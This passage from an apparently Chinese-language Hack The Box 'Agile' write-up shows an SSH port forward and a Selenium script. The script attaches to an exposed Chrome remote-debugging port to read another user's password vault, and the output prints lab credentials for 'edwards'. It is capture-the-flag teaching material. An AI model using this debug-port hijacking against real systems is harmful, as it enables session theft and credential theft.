+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl">┌──(kali㉿offsec)-[~<span class="hljs-regexp">/Desktop]</span><br><span class="hljs-regexp">└─$ ssh -L 5000:localhost:5000 corum@10.10.11.203</span><br><span class="hljs-regexp">corum@10.10.11.203&#x27;s password: </span><br><span class="hljs-regexp">Welcome to Ubuntu 22.04.2 LTS (GNU/</span>Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">60</span>-generic x86_64)<br><br> * Documentation:  https:<span class="hljs-regexp">//</span>help.ubuntu.com<br> * Management:     https:<span class="hljs-regexp">//lands</span>cape.canonical.com<br> * Support:        https:<span class="hljs-regexp">//u</span>buntu.com/advantage<br><br>This <span class="hljs-keyword">system</span> has been minimized by removing packages <span class="hljs-keyword">and</span> content that are<br><span class="hljs-keyword">not</span> required on a <span class="hljs-keyword">system</span> that users <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">log</span> into.<br><br>To restore this content, you can run the <span class="hljs-string">&#x27;unminimize&#x27;</span> command.<br><br>The programs included with the Debian GNU/Linux <span class="hljs-keyword">system</span> are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> program are described in the<br>individual files in /usr/share/doc/*<span class="hljs-regexp">/copyright.</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">Debian GNU/</span>Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br><br>Last login: Wed Mar  <span class="hljs-number">8</span> <span class="hljs-number">15</span>:<span class="hljs-number">25</span>:<span class="hljs-number">35</span> <span class="hljs-number">2023</span> from <span class="hljs-number">10.10</span>.<span class="hljs-number">14.47</span><br>corum@agile:~$ <br></code></pre></td></tr></table></figure>
+
+<p>34、然后访问</p>
+<p><code>http://127.0.0.1:5000/</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/26.png" srcset="/img/loading.gif" lazyload></p>
+<p>35、这里就是属于是测试网址了，但是到这里，我突然在其他的演练报告里，发现了更加便捷的方法</p>
+<p><code>https://otrashoui.xyz/agile/#corum-to-edwards</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs xml">from selenium import webdriver<br>from selenium.webdriver.chrome.options import Options<br><br>options = Options()<br>options.add_argument(&quot;--headless&quot;)<br>options.add_argument(&#x27;--disable-gpu&#x27;)<br>options.add_argument(&#x27;--crash-dumps-dir=/tmp&#x27;)<br>options.add_experimental_option(&quot;debuggerAddress&quot;, &quot;127.0.0.1:41829&quot;)<br>driver = webdriver.Chrome(options=options)<br><br>driver.get(&quot;http://test.superpass.htb/vault&quot;)<br>print(driver.page_source)<br><br><br>corum@agile:~$ ls<br>user.txt<br>corum@agile:~$ touch test.py<br>corum@agile:~$ vim test.py<br><br><br>corum@agile:~$ python3 test.py <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text y=%22.9em%22 font-size=%2290%22&gt;🦸&lt;/text&gt;&lt;/svg&gt;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SuperPassword 🦸<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/josefinsans.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/site.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/all.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css">                      <span class="hljs-selector-class">.htmx-indicator</span>&#123;<span class="hljs-attribute">opacity</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">200ms</span> ease-in;&#125;                      <span class="hljs-selector-class">.htmx-request</span> <span class="hljs-selector-class">.htmx-indicator</span>&#123;<span class="hljs-attribute">opacity</span>:<span class="hljs-number">1</span>&#125;                      <span class="hljs-selector-class">.htmx-request</span><span class="hljs-selector-class">.htmx-indicator</span>&#123;<span class="hljs-attribute">opacity</span>:<span class="hljs-number">1</span>&#125;                    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;d-flex flex-column min-vh-100&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-expand-sm fixed-top&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand d-flex w-50 me-auto&quot;</span>&gt;</span>🦸SuperPassword<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-toggler&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">data-bs-toggle</span>=<span class="hljs-string">&quot;collapse&quot;</span> <span class="hljs-attr">data-bs-target</span>=<span class="hljs-string">&quot;#navbarSupportedContent&quot;</span> <span class="hljs-attr">aria-controls</span>=<span class="hljs-string">&quot;navbarSupportedContent&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;Toggle navigation&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-toggler-icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;collapse navbar-collapse&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;navbarSupportedContent&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-nav w-100 justify-content-end&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/vault&quot;</span>&gt;</span>Vault<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/vault/export&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;noopener noreferrer&quot;</span>&gt;</span>Export<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/account/logout&quot;</span>&gt;</span>Logout<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br><br>    <br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;main_content&quot;</span>&gt;</span><br>        <br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-10&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;spacer30&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;vault-title&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/vault.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;vault&quot;</span>&gt;</span><br>                    Welcome to your vault<br>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/vault.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;vault&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;spacer30&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table table-striped table-hover&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;col&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;30%&quot;</span>&gt;</span>Site<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;col&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;30%&quot;</span>&gt;</span>Username<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;col&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;30%&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span> <span class="hljs-attr">hx-target</span>=<span class="hljs-string">&quot;closest tr&quot;</span> <span class="hljs-attr">hx-swap</span>=<span class="hljs-string">&quot;outerHTML swap:.25s&quot;</span>&gt;</span><br>        <br>            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;password-row&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hx-get</span>=<span class="hljs-string">&quot;/vault/edit_row/1&quot;</span> <span class="hljs-attr">hx-include</span>=<span class="hljs-string">&quot;closest tr&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fas fa-edit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hx-delete</span>=<span class="hljs-string">&quot;/vault/delete/1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa-solid fa-trash&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>agile<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>edwards<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>d07867c6267dcb5df0af<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <br>            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;password-row&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hx-get</span>=<span class="hljs-string">&quot;/vault/edit_row/2&quot;</span> <span class="hljs-attr">hx-include</span>=<span class="hljs-string">&quot;closest tr&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fas fa-edit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hx-delete</span>=<span class="hljs-string">&quot;/vault/delete/2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa-solid fa-trash&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>twitter<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>dedwards__<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>7dbfe676b6b564ce5718<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;add-password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;4&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">hx-get</span>=<span class="hljs-string">&quot;/vault/add_row&quot;</span> <span class="hljs-attr">hx-swap</span>=<span class="hljs-string">&quot;beforebegin swap:.25s&quot;</span> <span class="hljs-attr">hx-target</span>=<span class="hljs-string">&quot;.add-password&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fade-me-out btn btn-primary&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;add_password&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fas fa-plus-circle&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> Add a password<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/vault/export&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;noopener noreferrer&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;visibility: none;&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa-solid fa-file-export&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> Export<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <br>                    <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;spacer30&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mt-auto&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;copyright&quot;</span>&gt;</span><br>            Copyright © <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>superpass.htb<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/jquery-3.3.1.slim.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/popper.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/bootstrap.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/htmx.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/_hyperscript.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>corum@agile:~$ <br></code></pre></td></tr></table></figure>
+
+<p>36、是的，没有错，直接把呢个测试脚本里的代码给利用出来， 来查看会出现什么信息。</p>
